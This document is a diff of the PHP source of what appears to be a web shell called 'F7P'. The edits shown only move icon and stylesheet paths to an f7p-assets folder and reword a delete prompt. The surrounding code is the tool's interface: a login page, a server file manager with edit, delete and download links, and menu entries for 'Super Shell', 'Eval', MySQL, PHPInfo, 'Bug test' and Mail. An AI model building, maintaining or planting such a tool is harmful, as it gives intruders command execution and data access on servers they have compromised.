@@ -50,7 +50,7 @@ if (!$is_logged_in) {
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <title>F7P - Login</title>
-        <link rel="stylesheet" href="style.css">
+        <link rel="stylesheet" href="f7p-assets/_style.css">
     </head>
     <body class="login-page">
         <div class="login-container">
@@ -303,13 +303,13 @@ function showdir($pwd,$prompt){
 	$buff .= "<thead><tr><th>name</th><th>size</th><th></th></tr></thead><tbody>";
 
 $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".$parent."'\">
-    <td class=\"file-name\"><span class=\"folder-icon\"><img width=24px src=img/up.png></span> ..</td>
+    <td class=\"file-name\"><span class=\"folder-icon\"><img width=24px src=f7p-assets/up.png></span> ..</td>
     <td>go up one dir</td>
     <td style=\"text-align:right;\">
-<a href=\"?y=$pwd&amp;x=upload\" data-no-ajax=\"true\"><img width=24px src=img/upload.png></a>
+<a href=\"?y=$pwd&amp;x=upload\" data-no-ajax=\"true\"><img width=24px src=f7p-assets/upload.png></a>
         
-        <a href=\"?y=$pwd&amp;mkdir=new_folder\" data-no-ajax=\"true\" onclick=\"event.stopPropagation();\"><img width=24px src=img/new-dir.png></a>
-<a href=\"?y=$pwd&amp;edit=newfile.php\" data-no-ajax=\"true\" onclick=\"event.stopPropagation();\"><img width=24px src=img/add-file.png></a> 
+        <a href=\"?y=$pwd&amp;mkdir=new_folder\" data-no-ajax=\"true\" onclick=\"event.stopPropagation();\"><img width=24px src=f7p-assets/new-dir.png></a>
+<a href=\"?y=$pwd&amp;edit=newfile.php\" data-no-ajax=\"true\" onclick=\"event.stopPropagation();\"><img width=24px src=f7p-assets/add-file.png></a> 
 
     </td>
 </tr>";
@@ -321,7 +321,7 @@ $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.lo
     $buff .= "<tr style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".urlencode($pwd.$folder.DIRECTORY_SEPARATOR)."'\">
         <td class=\"file-name\">
             <span class=\"folder-icon\">
-                <img width=20px src=img/dir.png>
+                <img width=20px src=f7p-assets/dir.png>
             </span> 
             <span class=\"file-name-text\" id=\"{$safe_id}_link\">".htmlspecialchars($folder)."</span>  <!-- ← Tambahkan class -->
             <form action=\"?y=".urlencode($pwd)."\" method=\"post\" id=\"{$safe_id}_form\" class=\"rename-form\" style=\"display:none;\">
@@ -335,8 +335,8 @@ $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.lo
         </td>
         <td></td>
         <td style=\"white-space:nowrap;text-align:right;\">
-            <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();showRenameAlert('".addslashes($folder)."', '".addslashes($full_folder)."', '".addslashes($pwd)."', 'folder');\" title=\"Rename\"><img width=20px src=img/rename.png></a>
-            <a href=\"?y=".urlencode($pwd)."&amp;fdelete=".urlencode($pwd.$folder)."\" onclick=\"event.stopPropagation();return confirmDelete('".addslashes($folder)."', 'folder');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=img/rcb.png></a>
+            <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();showRenameAlert('".addslashes($folder)."', '".addslashes($full_folder)."', '".addslashes($pwd)."', 'folder');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
+            <a href=\"?y=".urlencode($pwd)."&amp;fdelete=".urlencode($pwd.$folder)."\" onclick=\"event.stopPropagation();return confirmDelete('".addslashes($folder)."', 'folder');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
         </td>
     </tr>";
 }
@@ -354,7 +354,7 @@ foreach($fname as $file){
     $buff .= "<tr>
         <td class=\"file-name\">
             <span class=\"file-icon\">
-                <img width=20px src=img/file.png>
+                <img width=20px src=f7p-assets/file.png>
             </span> 
             <a href=\"?y=$pwd&amp;$edit_link\" data-no-ajax=\"true\">".htmlspecialchars($file)."</a>
             <form action=\"?y=".$pwd."\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"rename-form\" style=\"display:none;margin:0;padding:0;\">
@@ -367,10 +367,10 @@ foreach($fname as $file){
         </td>
         <td>".$size."</td>
         <td style=\"white-space:nowrap;text-align:right;\">
-            <a href=\"?y=$pwd&amp;$view_link\" data-no-ajax=\"true\" title=\"View\"><img width=20px src=img/view.png></a>
-            <a href=\"javascript:void(0);\" onclick=\"showRenameAlert('".addslashes($file)."', '".addslashes($full)."', '".addslashes($pwd)."');\" title=\"Rename\"><img width=20px src=img/rename.png></a>
-            <a href=\"?y=$pwd&amp;delete=$full\" onclick=\"return confirmDelete('".addslashes($file)."', 'file');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=img/rcb.png></a>
-            <a href=\"?y=$pwd&amp;dl=$full\" data-no-ajax=\"true\" title=\"Download\"><img width=20px src=img/download.png></a>
+            <a href=\"?y=$pwd&amp;$view_link\" data-no-ajax=\"true\" title=\"View\"><img width=20px src=f7p-assets/view.png></a>
+            <a href=\"javascript:void(0);\" onclick=\"showRenameAlert('".addslashes($file)."', '".addslashes($full)."', '".addslashes($pwd)."');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
+            <a href=\"?y=$pwd&amp;delete=$full\" onclick=\"return confirmDelete('".addslashes($file)."', 'file');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
+            <a href=\"?y=$pwd&amp;dl=$full\" data-no-ajax=\"true\" title=\"Download\"><img width=20px src=f7p-assets/download.png></a>
         </td>
     </tr>";
 }
@@ -555,7 +555,7 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>F7P</title>
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="f7p-assets/_style.css">
     <script type="text/javascript">
         function initPushButton() {
             setTimeout(function() {
@@ -685,7 +685,7 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
         }
 
         function confirmDelete(name, type) {
-            return confirm('Move to trash?\n\n' + name);
+            return confirm('Move to the hell?\n\n' + name);
         }
 
         function toggleDropdown() {
@@ -1021,19 +1021,19 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
             <?php echo $breadcrumb_full; ?>
         </div>
         <div class="header-actions">
-            <button class="btn-icon" onclick="toggleCommand();" title="Toggle Command"><img width=24px src=img/terminalx.png></button>
+            <button class="btn-icon" onclick="toggleCommand();" title="Toggle Command"><img width=24px src=f7p-assets/terminalx.png></button>
             <div class="dropdown">
                 <button class="dropdown-toggle" onclick="toggleDropdown();" title="More">⋮</button>
                 <div class="dropdown-menu" id="dropdown-menu">
-                    <a href="?<?php echo "y=".$pwd; ?>" data-no-ajax="true"><img width=24px src=img/explorer.png> Explorer</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=github" data-no-ajax="true"><img width=24px src=img/github.png> GitHub API</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell" data-no-ajax="true"><img width=24px src=img/terminalx.png> Super Shell</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=php" data-no-ajax="true"><img width=24px src=img/eval.png> Eval</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql" data-no-ajax="true"><img width=24px src=img/mysql.png> MySQL</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo" data-no-ajax="true"><img width=24px src=img/php.png> PHPInfo</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit" data-no-ajax="true"><img width=24px src=img/bug.png> Bug test</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mail" data-no-ajax="true"><img width=24px src=img/mailer.png> Mail</a>
-                    <a href="?logout=1" data-no-ajax="true" style="border-top:2px solid #eee;margin-top:4px;color:#cc3333;"><img width=24px src=img/logout.png> Logout</a>
+                    <a href="?<?php echo "y=".$pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/explorer.png> Explorer</a>
+                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=github" data-no-ajax="true"><img width=24px src=f7p-assets/github.png> GitHub API</a>
+                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell" data-no-ajax="true"><img width=24px src=f7p-assets/terminalx.png> Super Shell</a>
+                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=php" data-no-ajax="true"><img width=24px src=f7p-assets/eval.png> Eval</a>
+                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql" data-no-ajax="true"><img width=24px src=f7p-assets/mysql.png> MySQL</a>
+                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo" data-no-ajax="true"><img width=24px src=f7p-assets/php.png> PHPInfo</a>
+                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit" data-no-ajax="true"><img width=24px src=f7p-assets/bug.png> Bug test</a>
+                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mail" data-no-ajax="true"><img width=24px src=f7p-assets/mailer.png> Mail</a>
+                    <a href="?logout=1" data-no-ajax="true" style="border-top:2px solid #eee;margin-top:4px;color:#cc3333;"><img width=24px src=f7p-assets/logout.png> Logout</a>
                 </div>
             </div>
         </div>
@@ -1408,13 +1408,13 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
             <textarea class="output" name="content" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
             
             <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
-                <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=img/previous.png></a>
+                <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
                 <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
                 <input class="inputzbut" type="submit" value="Save" name="save" style="flex:1;min-width:70px;" />
             </div>
             
             <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
-                <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=img/github.png></span>
+                <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=f7p-assets/github.png></span>
                 <input class="inputz" id="github_full_path" type="text" style="flex:2;min-width:120px;font-size:13px;font-family:monospace;" 
                        value="Loading..." readonly />
                 <input class="inputzbut" type="button" value="Push to Git" id="pushToGitBtn" onclick="pushToGitHub()" style="flex:1;min-width:70px;background:#2b3137;opacity:0.5;cursor:not-allowed;" disabled />
